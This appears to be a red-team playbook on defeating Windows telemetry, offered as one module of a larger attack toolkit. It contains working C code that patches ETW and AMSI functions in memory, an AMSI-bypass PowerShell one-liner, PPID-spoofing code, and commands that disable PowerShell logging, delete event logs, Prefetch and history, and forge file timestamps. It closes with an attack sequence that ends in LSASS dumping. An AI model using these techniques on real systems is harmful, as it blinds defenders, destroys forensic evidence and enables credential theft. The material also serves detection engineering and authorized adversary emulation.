# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Authorized red teams / adversary emulation / own-product testing only; using this against unauthorized targets is forbidden.

EDR detection capability depends heavily on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document collects red-team countermeasures for these two pipelines, plus anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Mapped to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW Internals

ETW is Windows' built-in high-performance event tracing framework; EDRs use it for "lightweight kernel telemetry".
The providers red teams care about most:

| Provider GUID | Name | Who uses it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | base process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key userland APIs

| API | DLL | Purpose |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | writes events (most used) |
| `EtwEventWriteFull` | `ntdll.dll` | events with an activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | extended version |
| `NtTraceEvent` | `ntdll.dll` | the layer under EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | controls trace sessions (start/stop/query providers) |
| `EtwEventEnabled` | `ntdll.dll` | whether a provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | registers a provider |

### Call chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumers (EDR userland processes subscribed to the session)
```

## 2. Three ETW Patch Methods

### Method A: EtwEventWrite head patch

Directly change the entry of `ntdll!EtwEventWrite` to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

Patched (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use the indirect-syscall variant
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing to ntdll memory is itself an `ALPC_MODIFY_PROCESS` / `PROTECTVM` event source monitored by ETW-TI.
You MUST **first use an indirect syscall that bypasses the NtProtectVirtualMemory hook, then patch** —
otherwise the EDR receives the alert before the patch even takes effect.

### Method B: EtwEventEnabled always-false

More covert: instead of modifying `EtwEventWrite`, make `EtwEventEnabled` always return FALSE;
the application layer decides "provider is not enabled" on its own → never calls `EtwEventWrite`. Friendlier to memory hash integrity checks (many EDRs verify the `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl to disable providers

Use the syscall to stop the EDR session directly (intrusive, but does not touch ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// requires SeSystemProfilePrivilege or higher
// applicable after Local Admin + UAC bypass
```

Rarely used in practice because:

- stopping a session itself triggers an "ETW provider stopped" event sensed by another pipeline
- high privileges are required

### Method D: kernel-mode ETW patch (only when BYOVD/kernel read-write already exists)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
set directly to 0 so all ETW-TI events are dropped
```

This belongs to the BYOVD phase of attack-chain; this skill does not go deeper.

## 3. AMSI Bypass

AMSI is the interface Windows provides for PowerShell / .NET / WMI / VBA to run antivirus scans before executing scripts.
Red teams most often encounter PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// at the amsi.dll!AmsiScanBuffer entry, write:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

One-line PowerShell version (detection-countermeasure reference only; it is itself signatured / blocked by Defender):

```powershell
# Concept demo — real environments must combine it with obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced option 1: Hardware Breakpoint AMSI Bypass

Does not touch amsi.dll memory (will not trigger integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. When the VEH fires, set `RAX = 0x80070057`, `RIP = the address of a ret instruction`, `RSP += 8`
4. ContinueExecution

This shares the same infrastructure as the HWBP Blindside in unhook-techniques.md — the VEH can be reused.

### Advanced option 2: corrupt AmsiContext / AmsiSession

Craft a malformed `AmsiContext` structure so `AmsiScanBuffer` fails an internal validation and returns success early:

```text
// the AmsiContext header should have the "AMSI" magic
// changing it to "XXXX" → the internal validation inside AmsiScanBuffer fails, yet it returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced option 3: reflectively load a copy of amsi.dll

Instead of the system amsi.dll, reflectively load a clean copy into the process and redirect the PowerShell engine's AMSI calls to it.
Suited to advanced EDRs that already intercept PowerShell.exe at the loading stage.

## 4. Anti-Forensics: Clearing Traces

### Disabling PowerShell ScriptBlock Logging

```powershell
# Registry (administrator required)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clearing the PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clearing Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear everything (heavy-handed; use with care)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clearing ETL logs

```powershell
# Stop the session, then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: deleting the .evtx directly makes the Event Log Service recreate it and write a "log cleared" event (Event ID 1102)
# More covert: patch the EventLog API of wevtsvc.dll in memory (part of T1070.001)
```

### Timestamp spoofing (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evading Sysmon Monitoring

Sysmon is the community's most common free telemetry (many enterprises use the olaf configuration).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (includes PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion approaches

1. **Do not create new processes** — act entirely inside an already-injected process, avoiding Event ID 1
2. **PPID Spoof** — use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe` so the Sysmon ProcessCreate looks legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + untouched images** — Process Hollowing is already caught by Event ID 25 in newer Sysmon versions.
   Prefer newer techniques such as **module stomping** (overwriting a section of an already-loaded legitimate DLL) or **dirty vanity**,
   combined with PPID spoofing
4. **No remote threads** — avoid Event ID 8; use `NtCreateThreadEx` within your own process / APC / Early Bird APC
5. **DNS over DoH / HTTPS** — avoid Event ID 22

## 6. Call Stack Spoofing + Timestamps to Look Like Legitimate Software

Even when ProcessCreate is unavoidable (e.g., some scenarios must spawn a child), you can:

- make the CommandLine resemble that of some legitimate software
- PPID-spoof to services.exe (masquerading as an SCM-started service)
- alter the Image hash seen by ImageLoad: put the implant code into a signed DLL's memory space via module stomping
- combine with CallStackSpoofer: Sysmon sees no implant frames even with EnableCallTracing on

## 7. Real-World OPSEC: Operation Order

**Getting the order wrong lets the EDR receive alerts first**, and everything after gets cut off.

The correct order:

```text
1. AMSI bypass (HWBP first, avoid writing to amsi.dll)
   --- so that .NET / PowerShell is not scanned when loading the implant
2. ETW patch (patch EtwEventWrite first, before doing any syscall)
   --- shut off telemetry for your own subsequent actions
3. Call NtProtectVirtualMemory via an indirect syscall
   --- prepare a "safe" memory-permission switching channel
4. Unhook ntdll (Peruns Fart) or enable indirect syscalls
   --- wipe the userland hooks
5. Call stack spoof setup
   --- prepare fake stacks for all later syscalls
6. Execute the actual payload (injection / lateral movement / LSASS dump)
7. Clear traces (PowerShell history / Prefetch / timestamps)
```

Example of the wrong order:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → the SOC already has the alert
❌ Dump LSASS first → AMSI / ETW not yet suppressed → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW Patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing Callback

After completing this trio (hook survey → unhook → telemetry blinding), return to `SKILL.md` Step 5 to verify in the sandbox,
then move to the next stage following the initial-access and lateral-movement chapters of `attack-chain/`.
